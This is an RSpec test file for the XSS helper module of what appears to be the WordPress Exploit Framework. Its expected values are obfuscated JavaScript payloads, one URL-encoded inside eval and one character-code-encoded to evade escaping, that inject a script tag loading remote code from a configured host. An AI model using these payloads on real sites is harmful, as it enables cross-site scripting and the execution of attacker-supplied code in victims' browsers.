# frozen_string_literal: true

require_relative '../spec_helper'
require 'erb'

describe Wpxf::WordPress::Xss do
  let(:subject) do
    Class.new(Wpxf::Module) do
      include Wpxf::WordPress::Xss
    end.new
  end

  before :each do
    subject.set_option_value('xss_host', '127.0.0.1')
    subject.set_option_value('xss_path', 'path')
    subject.set_option_value('http_server_bind_port', 1234)
  end

  describe '#new' do
    it 'registers xss_host and xss_path options' do
      expect(subject.get_option('xss_host')).to_not be_nil
      expect(subject.get_option('xss_path')).to_not be_nil
    end
  end

  describe '#xss_host' do
    it 'returns the normalized value of the xss_host option' do
      expect(subject.xss_host).to eq '127.0.0.1'
    end
  end

  describe '#xss_path' do
    it 'returns the normalized value of the xss_path option' do
      expect(subject.xss_path).to eq 'path'
    end
  end

  describe '#xss_url' do
    it 'returns the URL to be requested by the XSS attack' do
      expect(subject.xss_url).to eq 'http://127.0.0.1:1234/path'
    end
  end

  describe '#xss_include_script' do
    it 'returns the encoded JS include script wrapped in an eval call' do
      encoded = 'eval(decodeURIComponent(/var%20a%20%3D%20document.createElem'\
                'ent%28%22script%22%29%3Ba.setAttribute%28%22src%22%2C%20%22h'\
                'ttp%3A%2F%2F127.0.0.1%3A1234%2Fpath%22%29%3Bdocument.head.app'\
                'endChild%28a%29%3B/.source))'
      expect(subject.xss_include_script).to eq encoded
    end
  end

  describe '#xss_ascii_encoded_include_script' do
    it 'returns a JS include script that is ASCII encoded to bypass '\
       'automatic escaping by the likes of magic-quotes' do
      encoded = 'eval(String.fromCharCode(101,118,97,108,40,100,101,99,'\
                '111,100,101,85,82,73,67,111,109,112,111,110,101,110,116,'\
                '40,47,118,97,114,37,50,48,97,37,50,48,37,51,68,37,50,48,'\
                '100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,'\
                '69,108,101,109,101,110,116,37,50,56,37,50,50,115,99,114,'\
                '105,112,116,37,50,50,37,50,57,37,51,66,97,46,115,101,116,'\
                '65,116,116,114,105,98,117,116,101,37,50,56,37,50,50,115,'\
                '114,99,37,50,50,37,50,67,37,50,48,37,50,50,104,116,116,'\
                '112,37,51,65,37,50,70,37,50,70,49,50,55,46,48,46,48,46,49,'\
                '37,51,65,49,50,51,52,37,50,70,112,97,116,104,37,50,50,37,'\
                '50,57,37,51,66,100,111,99,117,109,101,110,116,46,104,101,'\
                '97,100,46,97,112,112,101,110,100,67,104,105,108,100,37,50,'\
                '56,97,37,50,57,37,51,66,47,46,115,111,117,114,99,101,41,41))'
      expect(subject.xss_ascii_encoded_include_script).to eq encoded
    end
  end

  describe '#xss_url_and_ascii_encoded_include_script' do
    it 'returns a URL encoded version of #xss_ascii_encoded_include_script' do
      expect(subject.xss_url_and_ascii_encoded_include_script).to eq ERB::Util.url_encode(subject.xss_ascii_encoded_include_script)
    end
  end
end
